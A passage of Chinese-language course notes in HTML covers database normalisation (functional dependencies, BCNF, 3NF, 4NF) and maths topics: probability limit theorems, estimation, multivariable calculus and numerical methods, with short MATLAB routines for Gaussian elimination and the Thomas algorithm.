<li>overlapping: 一个entity可以属于多个entity set</li>
</ul>
<p><img src="Basic/Database/../images/image-20210619151246010.png" alt="image-20210619151246010" /></p>
<h4 id="aggregate"><a class="header" href="#aggregate">aggregate</a></h4>
<p>因为ER图不能表达关系之间的关系。设想下面这个场景，本来我们有一个三元关系 <code>instructor指导student完成project</code>，然后我们现在要对他进行评价。那么我们就需要把这个三元关系aggregate，然后和<code>evaluation</code>建立联系。</p>
<p><img src="Basic/Database/../images/image-20210619152213134.png" alt="image-20210619152213134" /></p>
<h3 id="总结-1"><a class="header" href="#总结-1">总结</a></h3>
<p>一个大学数据库的例子：</p>
<p><img src="Basic/Database/../images/image-20210619153535444.png" alt="image-20210619153535444" /></p>
<h2 id="二范式"><a class="header" href="#二范式">二、范式</a></h2>
<p>我们要合理的数据数据库，要避免下面的一些陷阱pitfalls</p>
<ul>
<li>Redundant storage。数据冗余</li>
<li>insert/delete/update anomalies。插入/删除/修改异常。</li>
</ul>
<h3 id="第一范式-1nf"><a class="header" href="#第一范式-1nf">第一范式 1NF</a></h3>
<p>第一范式，要求所有的属性的域是<strong>原子的</strong>。也就是说域的元素是不可分的单元。</p>
<p>比如一个人的名字，包含姓和名，我们认为这不是原子的。比如一个数字123，如果我们把他看成一个数字他就是原子的，如果我们把它看成一个字符序列，那么他就不是原子的。有时候使用组合值可以得到更好的效果，第一范式并不一定是最好的。</p>
<p>对于组合属性：让每个子属性本身成为成为一个属性
对于多值属性：为多值集合中的每个项创建一条元组</p>
<h3 id="第三范式-3nf"><a class="header" href="#第三范式-3nf">第三范式 3NF</a></h3>
<p>我们首先要理解<strong>函数依赖</strong>。属性的集合用希腊字母如$\alpha$表示，R表示一个关系模式。t表示元组。</p>
<h4 id="函数依赖"><a class="header" href="#函数依赖">函数依赖</a></h4>
<p>函数依赖：$\alpha$和$\beta$指的是属性集。 $f=\alpha \rightarrow \beta$的意思是$t_1[\alpha] = t_2[\alpha] \Rightarrow t_1[\beta]=t_2[\beta]$。我们说$\alpha$决定$\beta$。是不是感觉和之前的key非常相似。如果R上的所有的元组t满足f，我们说f在R上hold。</p>
<p>有下面几条公理（前三）和定理（后三）</p>
<blockquote>
<p>自反率 $\beta \subseteq \alpha \Rightarrow \alpha \rightarrow \beta$</p>
<p>增补率 $\alpha \rightarrow \beta \Rightarrow \gamma \alpha \rightarrow \gamma  \beta$</p>
<p>传递率 $\alpha \rightarrow \beta ,\beta\rightarrow \gamma \Rightarrow \alpha \rightarrow \gamma$</p>
</blockquote>
<h4 id="闭包"><a class="header" href="#闭包">闭包</a></h4>
<p>由此，我们可以给出一个<strong>函数依赖集</strong>$F$的closure $F^+$。$F^+$是$F$ **能推导出的(或者说逻辑蕴含)**所有函数依赖$f$的集合。这是求closure的算法1：所以我们判断一个$\alpha$是否是关系R的superkey，就可以判断$\alpha$能不能唯一确定一个tuple，也即是$\alpha^+ \rightarrow R$。</p>
<p><img src="Basic/Database/../images/image-20210410160244335.png" alt="image-20210410160244335" /></p>
<p>计算属性集合的closure，就是看属性集里面的元素还能推导出什么然后不断的加入就可以了。</p>
<p><img src="Basic/Database/../images/image-20210410161614336.png" alt="image-20210410161614336" /></p>
<h4 id="正则覆盖"><a class="header" href="#正则覆盖">正则覆盖</a></h4>
<p>直观地说，F的正则覆盖（记做$F_c$ ）是指与F等价的“极小的”函数依赖集合</p>
<p>如何计算Fc ：删除多余属性，存在以下三种情况</p>
<ul>
<li>
<p>函数依赖集中存在可由其他函数依赖推导出的函数依赖$F = {A\rightarrow C, A\rightarrow  B, B \rightarrow  C } \Rightarrow F_c = {A\rightarrow  B, B \rightarrow  C }$</p>
</li>
<li>
<p>函数依赖左边部分存在属性冗余。比如在这个例子中，A可以推导出C </p>
<p>$F = {A\rightarrow B, B\rightarrow  C, AC \rightarrow  D } \Rightarrow 
F_c = {A\rightarrow  B, B \rightarrow  C,A \rightarrow  D }$</p>
</li>
<li>
<p>函数依赖右边部分存在属性冗余</p>
<p>$F = {A\rightarrow B, B\rightarrow  C, A \rightarrow  CD } \Rightarrow F_c = {A\rightarrow  B, B \rightarrow  C,A \rightarrow  D }$</p>
</li>
</ul>
<p>无关属性，分别对应上面提到的后面两个</p>
<p><img src="Basic/Database/../images/image-20210410164307838.png" alt="image-20210410164307838" /></p>
<p>计算F的正则覆盖：</p>
<p><img src="Basic/Database/../images/image-20210410164439736.png" alt="iom" /></p>
<h4 id="无损分解保持依赖boyce-codd范式"><a class="header" href="#无损分解保持依赖boyce-codd范式">无损分解、保持依赖、Boyce-Codd范式</a></h4>
<ul>
<li>
<p>$R_1,R_2$是关系r的分解，如果满足${\textstyle \prod_{R_1} (r)} \bowtie  {\textstyle \prod_{R_2} (r)} =r$，那么我们说$R_1,R_2$是r的<strong>无损分解lossless decompositio</strong>n。BCNF和3NF都要满足这个条件。</p>
<p>判断是否是无损分解，可以将</p>
</li>
<li>
<p><strong>保持依赖</strong>：$(F_1\cup F_2 \cup F_3...\cup F_4)^+ = F^+$	</p>
<p>如果直接计算$F^+$，计算量很大。求解办法，对$F$的<strong>每一个函数依赖$\alpha \rightarrow \beta$进行下面的过程：如果result包含$\beta$的话，说明该依赖被保持。如果所有的都满足，那么该分解保持依赖</strong></p>
<p>其实，这个是在研究属性集合$\alpha$的闭包。</p>
<p><img src="Basic/Database/../images/image-20210420203919897.png" alt="image-20210420203919897" /></p>
</li>
<li>
<p>关系R具有函数依赖集合F，<strong>R属于BCNF</strong>当且仅当对 $F^+$中所有的函数依赖$\alpha \rightarrow \beta$，下面至少有一项成立：</p>
<ul>
<li>$\alpha \rightarrow \beta$ 是平凡的函数依赖，也就是说 $\beta \subseteq \alpha$。</li>
<li>$\alpha$是R的superkey。</li>
</ul>
</li>
</ul>
<p>为检查具有函数依赖集合$F$的关系模式$R$是否属于BCNF，只需检查$F$中的函数依赖是否违反BCNF即可，而不需检查$F^+$中的所有函数依赖。可在$F$下判别R 是否违反BCNF，但须在$F
^+$下判别R的分解式是否违反BCNF。BCNF分解算法：</p>
<p><img src="Basic/Database/../images/image-20210410193603914.png" alt="image-20210410193603914" /></p>
<p>BCNF分解<strong>不总是保持依赖</strong>的。所以我们提出了3NF。</p>
<h4 id="第三范式"><a class="header" href="#第三范式">第三范式</a></h4>
<p>关系R具有函数依赖集合F，R属于3NF当且仅当对 $F^+$中所有的函数依赖$\alpha \rightarrow \beta$，下面至少有一项成立：</p>
<ul>
<li>$\alpha \rightarrow \beta$ 是平凡的函数依赖，也就是说 $\beta \subseteq \alpha$。</li>
<li>$\alpha$是R的superkey。</li>
<li>$\beta - \alpha$的每个属性A都包含于R的一个candidate key中。（回顾，candidate key是最小的superkey，去掉任何一个属性就不是superkey了）</li>
</ul>
<p>很明显的看出3NF比BCNF要弱一点，因此存在一定的信息冗余。其实上面说的三条是我们分解的目标，但是因为不能保证同时达成依赖保持和BCNF，所以我们提出了3NF。</p>
<p>3NF的分解方法：</p>
<p><img src="Basic/Database/../images/image-20210410195854899.png" alt="image-20210410195854899" /></p>
<p>检测3NF</p>
<ul>
<li>对于每一个$\alpha \rightarrow \beta$检测$\alpha$是否是superkey，如果否
<ul>
<li>检查$\beta$中的每个属性是否包含在R 的某个candidate key中</li>
<li>所以我们对于给定的R，我们要找出所有的candidate key。<strong>这是一个NP-hard的问题</strong>。</li>
</ul>
</li>
</ul>
<p><img src="Basic/Database/../images/20200516174600750.jpg" alt="img" /></p>
<h3 id="第四范式-4nf"><a class="header" href="#第四范式-4nf">第四范式 4NF</a></h3>
<h4 id="多值依赖-multivalue-dependencies"><a class="header" href="#多值依赖-multivalue-dependencies">多值依赖 Multivalue Dependencies</a></h4>
<p>比如，一门课程确定了，那么上这门课的**老师们(是一个集合)**就确定了。</p>
<h4 id="第四范式"><a class="header" href="#第四范式">第四范式</a></h4>
<p>分解方法：</p>
<p><img src="Basic/Database/../images/image-20210420214753923.png" alt="image-20210420214753923" /></p>
<h2 id="总结-2"><a class="header" href="#总结-2">总结</a></h2>
<p>设计方法一：</p>
<ol>
<li>把所有的属性先放到一张表中，称为universal relation。</li>
<li>然后用各种范式把冗余去除</li>
</ol>
<p>设计方法二：</p>
<ol>
<li>用ER图。一般我们通过ER图就能得到较好的结果。</li>
</ol>
<p>去除冗余可以节约空间，但是我们不总是要把冗余都去除。而且，也不是所有满足范式的设计都是好的。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="maths"><a class="header" href="#maths">Maths</a></h1>
<p>我觉得数学是很重要的，以后有时间一定好好学！</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="大数定理和中心极限定理"><a class="header" href="#大数定理和中心极限定理">大数定理和中心极限定理</a></h1>
<h2 id="两个不等式"><a class="header" href="#两个不等式">两个不等式</a></h2>
<p>这两个不等式是后面的基础。</p>
<h3 id="markov不等式"><a class="header" href="#markov不等式">Markov不等式</a></h3>
<p>$P[|Y|\ge \epsilon] \le \frac {E[|Y|^k]}{\epsilon ^k}$</p>
<h3 id="chebyshev不等式"><a class="header" href="#chebyshev不等式">Chebyshev不等式</a></h3>
<p>$P[|X-\mu|\ge \epsilon] \le \frac {\sigma ^2}{\epsilon ^2}$ 。不管随机变量的类型是什么，只要知道他的数学期望和方差，就可以对随机变量落入数学期望附近的区域$(\mu-\epsilon,\mu+\epsilon)$内或外的概率给出估计。</p>
<h2 id="大数定律"><a class="header" href="#大数定律">大数定律</a></h2>
<p>Bernoulli 大数定理</p>
<p>依概率收敛和以概率1收敛(wp1)</p>
<p><img src="Basic/Maths/../images/image-20210619202940359.png" alt="image-20210619202940359" /></p>
<p>弱大数定律，有叫做辛钦大数定律：</p>
<p><img src="Basic/Maths/../images/image-20210619203003790.png" alt="image-20210619203003790" /></p>
<h2 id="中心极限定理"><a class="header" href="#中心极限定理">中心极限定理</a></h2>
<p>强大数律和弱大数律分别讨论了随机序列部分和的依概率收敛和以概率 1 收敛.
中心极限定理讨论对充分大的 n, 随机变量的部分和 X1 + X2 + · · · + Xn的概率分布问题</p>
<p><img src="Basic/Maths/../images/image-20210619204234319.png" alt="image-20210619204234319" /></p>
<h2 id="点估计"><a class="header" href="#点估计">点估计</a></h2>
<h3 id="矩估计"><a class="header" href="#矩估计">矩估计</a></h3>
<p><img src="Basic/Maths/../images/image-20210619212250630.png" alt="image-20210619212250630" /></p>
<p>具体的矩估计的公式和分布有关，1.12。</p>
<h3 id="极大似然估计"><a class="header" href="#极大似然估计">极大似然估计</a></h3>
<p>假设某事件A发生的概率依赖于未知参数$\theta$，如果观察到A已经发生，那么就取$\theta$的估计值让事件A发生的概率最大。</p>
<p><img src="Basic/Maths/../images/image-20210619214828295.png" alt="image-20210619214828295" /></p>
<p>有点抽象吧。。举个例子：</p>
<blockquote>
<p>假设有一个造币厂生产某种硬币，现在我们拿到了一枚这种硬币，想试试这硬币是不是均匀的。即想知道抛这枚硬币，正反面出现的概率（记为θ）各是多少？这是一个统计问题，回想一下，解决统计问题需要什么？ 数据！</p>
<p>于是我们拿这枚硬币抛了10次，得到的数据是：反正正正正反正正正反。我们想求的正面概率θ。θ是模型参数，而抛硬币模型我们可以假设是 二项分布。</p>
<p>那么，出现实验结果$ x_0$（即反正正正正反正正正反）的似然函数是多少呢？</p>
<p>$f(x_0 ,\theta) = (1-\theta)\times\theta\times\theta\times\theta\times\theta\times(1\theta)\times\theta\times\theta\times\theta\times(1-\theta) = \theta ^ 7(1 - \theta)^3 = f(\theta)$</p>
<p>注意，这是个只关于θ的函数。而最大似然估计，顾名思义，就是要最大化这个函数。我们对f(θ)求导就可以看出，在θ = 0.7时，似然函数取得最大值。
————————————————
版权声明：本文为CSDN博主「nebulaf91」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/u011508640/article/details/72815981</p>
</blockquote>
<h3 id="估计的评价"><a class="header" href="#估计的评价">估计的评价</a></h3>
<p>无偏估计 unbiased estimation</p>
<p><img src="Basic/Maths/../images/image-20210619220059310.png" alt="image-20210619220059310" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="微积分下"><a class="header" href="#微积分下">微积分下</a></h1>
<p>内容基于卢兴江和陈锦辉主编的《微积分 下》</p>
<h1 id="级数"><a class="header" href="#级数">级数</a></h1>
<p><img src="Basic/Maths/../images/1596345971327.png" alt="" /></p>
<ul>
<li>一个速度估计 ：
$$ n!=\sqrt{{2 \pi n}(\frac{n}{e})^{n} } $$</li>
<li>拉比判别法 强于 根值判别法 强于 比值判别法 强于 根植判别法和比值判别法的极限形式（1）。</li>
<li>去掉，添加，改变级数的有限项，不改变级数的敛散性。
<strong>拉比判别法</strong>是判断一个实级数收敛的方法。在判断比几何级数收敛得慢的级数时，比柯西判别法、达朗贝尔判别法更有效。
<img src="Basic/Maths/../images/1598179347678.png" alt="拉比判别法" /></li>
<li>条件收敛和绝对收敛</li>
</ul>
<h3 id="幂级数展开"><a class="header" href="#幂级数展开">幂级数展开</a></h3>
<ul>
<li>幂级数收敛域：<em>阿贝尔定理</em>，对于边界条件要另外判断。可以用类似根值比值的方法。</li>
<li>幂级数性质：和函数连续性，逐项可积，逐项可导。</li>
<li>对于一般的函数，我们想把它在某域内展开成幂级数</li>
<li>怎么展开：就像泰勒展开。一般的，化成已知如何展开的函数，再利用线性、逐项可积、逐项可求导。
$f(x) = \sum_{n=0}^{+\infty}{\frac{f^{(n)}(x_0)}{n!}(x-x_0)^n}$</li>
<li>展开条件：任意阶可导。</li>
<li>展开之后是否收敛于原函数呢？<em>泰勒定理</em>，拉格朗日余项Rn(x)-&gt;0
<img src="Basic/Maths/../images/1598514551683.png" alt="" /></li>
</ul>
<h3 id="傅里叶展开"><a class="header" href="#傅里叶展开">傅里叶展开</a></h3>
<ul>
<li>
<p>利用三角函数的正交性（看书）</p>
</li>
<li>
<p>公式（注意a0/2，前面的系数）：
<img src="Basic/Maths/../images/1598536432067.svg" alt="" />
<img src="Basic/Maths/../images/1598514761907.svg" alt="" /></p>
</li>
<li>
<p>奇延拓，偶延拓。</p>
</li>
<li>
<p>狄利克雷定理。</p>
</li>
</ul>
<h1 id="空间解析几何"><a class="header" href="#空间解析几何">空间解析几何</a></h1>
<hr />
<ul>
<li>
<p>向量：加减，数乘，点乘，叉乘，混合积</p>
</li>
<li>
<p>平面：点法式，一般式，平面束</p>
</li>
<li>
<p>直线：点向式，参数式，交线式</p>
</li>
<li>
<p>共线，共面，垂直：利用高中的知识。。。</p>
</li>
<li>
<p>曲面：F（x,y,z）= 0——法向量如下，结合点坐标得切线方程与法平面方程。$( F^{'}_x , F^{'}_y , F^{'}_z )$</p>
</li>
<li>
<p>曲线：参数式——求导可得切线方向，结合点坐标得切线方程与法平面方程。$( X^{'}(t) , Y^{'}(t) , Z^{'}(t) )$</p>
</li>
<li>
<p>交线式——看书上例9.8.5的我的写法，有隐函数求导的味道了。</p>
</li>
<li>
<p>旋转曲面：某曲线绕直线旋转一周得到的曲面称为旋转曲面</p>
<ol>
<li>对应的点的连线垂直于转轴</li>
<li>对应的点到转轴的距离相同根据这两点列方程</li>
</ol>
</li>
<li>
<p>柱面：某直线沿一条曲线平行移动生成的曲面称为柱面，该直线称为<em>母线</em>，曲线称为<em>准线</em></p>
<ol>
<li>对于所得曲面上的任意一点P(x,y,z)，在<em>曲线</em>上存在一点P0(x0,y0,z0)，使得PP0平行于直线。由此列方程。</li>
</ol>
</li>
<li>
<p>投影曲线：某曲线I，在平面alpha上的投影。</p>
<ol>
<li>以alpha的法向为<strong>n</strong>母线，I为准线，得到<em>投影柱面</em>。投影柱面与平面的交线称为<em>投影曲线</em>。由此列方程。</li>
</ol>
</li>
<li>
<p>锥面：过空间内一定点A，过该定点的直线沿着不过该定点的曲线I移动，形成的曲面称为锥面。</p>
<ol>
<li>对于锥面上任意一点P（x,y,z），在 I 上都存在一点P0（x0,y0,z0），使得A，P，P0共线。由此列方程。</li>
</ol>
</li>
</ul>
<p>常见的二次曲面（看书）好难画。</p>
<h1 id="多元函数微分"><a class="header" href="#多元函数微分">多元函数微分</a></h1>
<hr />
<p>极限：
<img src="Basic/Maths/../images/1596451955334.svg" alt="推导关系" />
<img src="Basic/Maths/../images/1598680569615.svg" alt="等价证明" /></p>
<ul>
<li>需要知道各自的充要证明，即连续的定义，偏导数存在的证明，可微的证明。</li>
</ul>
<h3 id="偏导数"><a class="header" href="#偏导数">偏导数</a></h3>
<ul>
<li>高阶偏导数 —— 明确定义，偏导数也是函数。<strong>二阶偏导数连续，则二阶偏导数与偏导次序无关</strong>。</li>
<li>复合偏导数 —— 路线图，链式法则。</li>
<li>隐函数的偏导数  —— 两边同求偏导。</li>
</ul>
<h3 id="极值看书"><a class="header" href="#极值看书">极值（看书）</a></h3>
<ul>
<li>二元函数的极值——驻点，一个充分条件（二次型的正定性）。</li>
<li>条件极值——拉格朗日，不等式技巧。</li>
<li>拉格朗日引入新的函数，把原来的条件极值问题转换为求新函数的无条件极值问题。</li>
<li><strong>泰勒公式</strong>——默写，矩阵，二元函数的极值由此而来，两种余项。</li>
<li>方向导数与梯度——看书</li>
<li>向量函数</li>
</ul>
<h3 id="条件"><a class="header" href="#条件">条件</a></h3>
<p>函数f在点M处<strong>可微</strong>，才能把方向导数分解到三个方向求和（定理9.7.2）。
<strong>二阶偏导数连续</strong>，偏导数和次序无关（定理9.3.15）。
有<strong>二阶连续偏导数</strong>，才能用定理9.6.3（那个利用正定性判断极值的定理）。</p>
<h1 id="多元函数积分"><a class="header" href="#多元函数积分">多元函数积分</a></h1>
<hr />
<p><img src="Basic/Maths/../images/1596345959563.png" alt="" />
<img src="Basic/Maths/../images/1596507213866.png" alt="" /></p>
<ul>
<li>第二类曲面积分方法很多，上面那个是我觉得最靠谱的。</li>
<li>有很多几何物理上的应用。</li>
<li>格林公式的适用条件：要求P(x,y),Q(x,y)在区域上<strong>连续</strong>且<strong>一阶偏导连续</strong>，格林公式的L是边界曲线，区域在左侧是边界曲线的正向。</li>
<li>斯托克斯公式：常常用于计算边界为两曲面交线的第二类曲线积分。</li>
<li>对比定理11.4.2和曲线积分第一基本定理，发现曲线积分第一基本定理只要求P,Q<strong>连续</strong>，也不要求<strong>单连通</strong>，更弱。但也能说明曲线积分和路径无关。</li>
<li>梯度，散度，旋度</li>
</ul>
<p>$$
\nabla u(x,y,z)= (\frac{\partial u}{\partial x},\frac{\partial u}{\partial y},\frac{\partial u}{\partial z})   \
div \ \vec{u} = \nabla \cdot \vec{u}    \
rot \ \vec{u} = \nabla \times \vec{u}
$$</p>
<ul>
<li>关于旋度和散度，推荐<a href="https://www.bilibili.com/video/BV19s41157Z4">3Blue1Brown的视频</a>，可以直观的理解格林定理。</li>
<li>梯度，指向方向导数最大的方向，方向导数的最大值就是梯度的绝对值。</li>
<li>具体怎么积分，还是看书上的例题有更深的理解。</li>
<li>极坐标形式下的弧长微分。倒也不需要记住，用直角坐标系的弧长微分带进去就好了。
<img src="Basic/Maths/../images/1597070697767.svg" alt="" /></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="数值计算方法"><a class="header" href="#数值计算方法">数值计算方法</a></h1>
<h2 id="误差"><a class="header" href="#误差">误差</a></h2>
<p>我们需要用<strong>误差限</strong>$\delta$来确定我们想要的绝对误差程度，用相对误差限$\delta _r=\delta/x^<em>$来确定我们需要的相对误差程度。
如果对有效数字有要求，那么我们用有效数字的定义，让$\delta_r(X^</em>) \leq \frac {1} {2a_1}<em>10^{1-n}$。其中n是有效数字的位数（相对误差和有效数字）
也可以从有效数字的定义出发，让$\delta &lt; 1/2</em>10^{k-n}$（绝对误差和有效数字）。</p>
<p>如果是迭代方法。PPT 49页：
<img src="Basic/Maths/../images/1614741780638.jpg" alt="" /></p>
<p>两个几乎相等的浮点数相减，有效位数丢失。
大数+小数，小数被忽略
拖尾效应，正负相互抵消的无穷级数计算，会带来很大的误差。</p>
<p>误差传播的估计——微分</p>
<h2 id="非线性方程求根"><a class="header" href="#非线性方程求根">非线性方程求根</a></h2>
<p>图解法虽然精度不高，但是可以提供初值。</p>
<ul>
<li>划界法：利用函数在根附近改变符号的性质。需要两个根的初始猜测位于根的两侧（单根或奇重实根）
<ul>
<li>二分法：每次迭代根的估计值为$x = (x_l+x_r)/2$，真实根落在$(x_r-x_l) /2$的区间内，也就是误差限。</li>
<li>试位法：通过一条直线连接$(x_l,f(x_l)),(x_r,f(x_r))$，直线和x轴的交点作为新的根的估计值。</li>
</ul>
</li>
<li>开方法：收敛速度较快，但是存在发散的可能性。只需要一个根的初始猜测。
<ul>
<li>不动点法：把$f(x)=0$重组为$x=g(x)$。$|g'(x)|&gt;1$会发散，$|g'(x)|&lt;1$会收敛。</li>
<li>牛顿法：把$f(x)$在$x_i$处泰勒展开$f(x_{i+1} = f(x_i)+f'(x_i)(x_{i+1}-x_i)$，用切线代替曲线，求切线和x轴的交点。迭代函数$g(x)=x-\frac{f(x)}{f'(x)}，x_{i+1}=g(x_i)$。收敛速度快，二次收敛（收敛阶概念）。
缺点：需要求导数，对重根收敛速度慢，对初值的选取敏感，要求相当接近真解。</li>
<li>割线法：如果函数f(x)比较复杂，求导存在困难。</li>
</ul>
</li>
</ul>
<center>二分法参考程序</center>
<p><img src="Basic/Maths/../images/1615945816081.jpg" alt="二分法参考程序" /></p>
<center>试位法参考程序</center>
<p><img src="Basic/Maths/../images/1615946006137.jpg" alt="" /></p>
<center>不动点法参考程序</center>
<p><img src="Basic/Maths/../images/1615946189805.jpg" alt="" /></p>
<center>牛顿法参考程序</center>
<p><img src="Basic/Maths/../images/1615947192073.jpg" alt="" /></p>
<center>割线法参考程序</center>
<p><img src="Basic/Maths/../images/1615947947892.jpg" alt="" /></p>
<div class="table-wrapper"><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody>
<tr><td>fzero</td><td>单函数求根</td></tr>
<tr><td>roots</td><td>求多项式的根</td></tr>
<tr><td>poly</td><td>用已知的根构建多项式</td></tr>
<tr><td>polyval</td><td>求多项式的值</td></tr>
<tr><td>polyvalm</td><td>求带有矩阵变量的多项式的值</td></tr>
</tbody></table>
</div>
<h2 id="线性代数方程组求解"><a class="header" href="#线性代数方程组求解">线性代数方程组求解</a></h2>
<p><img src="Basic/Maths/../images/1616556046637.jpg" alt="" />
直接法：</p>
<ul>
<li>经过有限步算术运算，可求得方程组的精确解的方法（若在计算过程中没有舍入误差）</li>
<li>可预先估算使用机器时间，计算量小，但要占用较多内存，程序复杂。一般说来，<strong>适用于方程组的系数矩阵阶数不太高的问题。</strong></li>
<li>如高斯消元法、LU分解法、解三对角方程组的追赶法。</li>
</ul>
<p>迭代法：</p>
<ul>
<li>用某种极限过程去逐步逼近线性方程组精确解的方法</li>
<li>迭代法具有占存储单元少，程序设计简单，原始系数矩阵在迭代过程中不变等优点，但计算工作量有时较大，<strong>适用于方程组的系数矩阵为稀疏矩阵的问题。</strong></li>
<li>存在收敛性及收敛速度等问题，对方程组的系数矩阵有一定的要求，才能保证迭代过程的收敛</li>
<li>如雅可比迭代法、高斯-赛德尔迭代法 、超松弛迭代法。 </li>
</ul>
<p>线性代数方程组计算中得到近似计算结果的原因：
(1) 计算机的字长有限，不可避免地产生舍入误差；
(2) 初始数据有问题：由于系数矩阵A和右端项b元素带有某些观测误差，往往不是准确给出，或A, b元素是计算结果，包含舍入误差。
故实际使用矩阵为<code>A+∆A</code>和<code>b+ ∆b</code>。因此，需要分析初始数据A, b的微小误差（扰动）对解x的影响，即扰动方程<code>(A+ ∆A)(x+ ∆x)=b+ ∆b</code> 的解<code>x+ ∆x</code>和<code>x</code>之差。（我们衡量两个矩阵的差距用**范数||A||**之比，2范数最常用）
如果方程组的系数或常数项有微小改变时，解会发生很大的改变，则称这种方程组为“病态”的。
扰动方程的解与原方程的解相对误差不大，称为良态方程。</p>
<p>矩阵的条件数(Cond函数)。A的条件数Cond(A)相对大(&gt;&gt;1)，称Ax=b是病态方程组/坏条件，或A是病态的；当A的条件数Cond(A)相对小，称Ax=b是良态方程组/好条件，或A是良态的。
<img src="Basic/Maths/../images/1616555678252.jpg" alt="误差估计" />
<img src="Basic/Maths/../images/1616556298934.jpg" alt="迭代求精" /></p>
<center>matlab中矩阵相关的函数</center>
<div class="table-wrapper"><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody>
<tr><td>cond</td><td>计算矩阵条件数</td></tr>
<tr><td>右除/和左除\</td><td>help slash</td></tr>
<tr><td>norm</td><td>计算矩阵或向量的范数</td></tr>
<tr><td>lu</td><td>lu分解</td></tr>
<tr><td>inv</td><td>矩阵求逆</td></tr>
<tr><td>chol</td><td>cholesky分解</td></tr>
<tr><td>pinv</td><td>求矩阵伪逆</td></tr>
<tr><td>det</td><td>计算行列式的值</td></tr>
<tr><td>rank</td><td>求秩</td></tr>
<tr><td>eig，eigs</td><td>矩阵特征值</td></tr>
</tbody></table>
</div>
<h3 id="原始高斯消元法"><a class="header" href="#原始高斯消元法">原始高斯消元法</a></h3>
<p>利用初等变化。高斯消去法的实质是将A分解为两个三角矩阵的乘积。可能会出现除以0或除以一个和0非常接近的数字的情况。而且高斯消元法每一步都依赖于前一步的结果，误差可能会累加。可能的解决办法：</p>
<ul>
<li>对方程组进行缩放使得任何一行中的最大系数等于1，减小舍入误差。</li>
<li>选择绝对值最大者作为主元，进行行列交换，执行消元过程</li>
</ul>
<pre><code>% Gaussian elimination

function X=simple_gauss(A,B)
    n=length(A);
    for k=1:n-1
        for i=k+1:n
            factor = A(i,k)/A(k,k);
            for j=k+1:n
                A(i,j) = A(i,j)-factor*A(k,j);
            end
            B(i)=B(i)-factor*B(k);
        end
    end

    X(n)=B(n)/A(n,n);
    for i=n-1:-1:1
        sum = B(i);
        for j=i+1:n
            sum = sum-A(i,j)*X(j);
        end
        X(i)=sum/A(i,i);
    end
    X = X';
end
</code></pre>
<h3 id="lu分解三角分解"><a class="header" href="#lu分解三角分解">LU分解（三角分解）</a></h3>
<p>将A分解为两个三角形矩阵L与U的乘积<code>A=LU</code>
<code>AX=B</code> ➡️ <code>LUX=B</code>➡️令Y=UX，求解<code>LY=B</code>然后<code>UX=Y</code>。
那么问题在于如何分解
Doolittle分解：当A的各阶顺序主子式均不为零时，Doolittle分解可以实现并且唯一。
用比较等式两边元素的方法，逐行逐列求解L、U各元素。然后因为LU都是三角矩阵，求解简单。前向代入求解LY=B，后向代入求解UX=Y。
相比于高斯分解，不需要提前知道B的值，求解相同系数方程组效率高。时间复杂度和高斯分解差不多，</p>
<h3 id="三对角方程组的追赶法thomas算法"><a class="header" href="#三对角方程组的追赶法thomas算法">三对角方程组的追赶法（Thomas算法）</a></h3>
<p>看PPT。对三对角方程组适用效率高。</p>
<pre><code>function X=Thomas(A,B)
    m = length(A);
    beta = zeros(1,m);
    y = zeros(1,m);
    X = zeros(1,m);
    
    beta(1) = A(1,2)/A(1,1);
    y(1)=B(1)/A(1,1);
    for i = 2:m-1
        beta(i) = A(i,i+1)/(A(i,i)-A(i,i-1) *beta(i-1));
        y(i) = (B(i)-A(i,i-1)*y(i-1))/(A(i,i)-A(i,i-1)*beta(i-1));
    end
    i = m;
    y(i) = (B(i)-A(i,i-1)*y(i-1))/(A(i,i)-A(i,i-1)*beta(i-1));
    
    X(m) = y(m);
    for i = m-1:-1:1
        X(i) = y(i)-beta(i)*X(i+1);
    end
    
    X = X';
    
end
</code></pre>
<h3 id="对称正定矩阵方程组的cholesky分解"><a class="header" href="#对称正定矩阵方程组的cholesky分解">对称正定矩阵方程组的Cholesky分解</a></h3>
<p>看PPT。对对称正定方程组适用效率高。</p>
<p>----- |
| polyfit  | 根据数据用多项式进行最小二乘拟合 |
| interp1  | 一维插值（查表）                 |
| interp1q | 快速一维线性插值                 |
| interp2  | 二维插值                         |
| interpn  | n维插值                          |
| spline   | 三次样条插值                     |
| ppval    | 分段多项式估计函数               |
|lsqcurvefit|非线性最小二乘法|</p>
<h2 id="数值积分和微分"><a class="header" href="#数值积分和微分">数值积分和微分</a></h2>
<p>数值微分：数值微分的解往往不太稳定，精度较差。</p>
<ul>
<li>有限差商逼近导数</li>
<li>使用插值方法构造光滑曲线，对插值曲线微分</li>
</ul>
<p>数值积分：通常数值积分的过程是稳定的，所得的解精确度较高。</p>
<ul>
<li>Newton-Cotes 积分</li>
<li>龙贝格（Romberg）积分</li>
<li>高斯（Gauss）求积公式</li>
</ul>
<h3 id="有限差商近似"><a class="header" href="#有限差商近似">有限差商近似</a></h3>
<p>$f'(x_0) = \frac{f(x_0)-f(x_0-h)}{h} =  \frac{f(x_0+h)-f(x_0)}{h} = \frac{f(x_0+h/2)-f(x_0-h/2)}{h}$，分别是向前、向后、中心差商。还可以通过<strong>泰勒展开式子增加级数</strong>来增加精度。</p>
<p>$h$越小，误差越小，但同时舍入误差增大。我们用<strong>事后估计法</strong>来确定最佳的$h$</p>
<h3 id="插值型数值微分数值积分"><a class="header" href="#插值型数值微分数值积分">插值型数值微分/数值积分</a></h3>
<p>用插值函数的导数近似为原函数的导数。用三次样条插值的导数近似被插值函数的导数，效果相当好。</p>
<p>同样的也可以用插值得到的多项式的积分。n次插值至少有<strong>n阶代数精度。</strong></p>
<p><img src="Basic/Maths/../images/image-20210414103858816.png" alt="image-20210414103858816" /></p>
<h3 id="newton-cotes积分"><a class="header" href="#newton-cotes积分">Newton-Cotes积分</a></h3>
<p>插值积分需要插值点，我们让插值点等分就是Newton-Cotes积分。</p>
